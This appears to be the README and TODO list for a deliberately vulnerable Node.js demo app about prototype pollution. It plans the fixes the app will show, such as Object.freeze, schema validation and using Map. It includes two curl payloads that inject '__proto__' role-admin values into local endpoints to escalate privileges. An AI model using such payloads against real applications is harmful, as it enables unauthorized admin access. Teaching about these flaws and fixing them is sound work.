# Proto App

Application showcasing prototype pollution vulnerabilities in node.js

## TODO

- Backend API:
    - Direct protyotype pollution
    - Indirect prototype pollution
    - DoS 
- Vulnerabilies:
    - Property definition by path (ie someFoo(object, path, value) {object[path] = value})
- Fixed App:
    - Object.freeze:
        - Show how this fixes issues
        - Include a package which requires prototype manipulation (ie how this doesn't always work)
    - Schema Validation
    - Using Map instead of Object for key-value data storage

- exploits / commands:
    - indirect prototype pollution: curl -X POST http://localhost:3000/register -H "Content-Type: application/json" -d '{"__proto__": {"role": "admin"}, "username": "normaluser", "password": "normalpassword"}'
    - direct prototype pollution: curl -X POST http://localhost:3000/update/`id` -H "Content-Type: application/json" -d '{"path": "__proto__.role", "value": "admin"}'



## Vulnerable Packages
- lodash:
    - 4.17.17 (fixed version)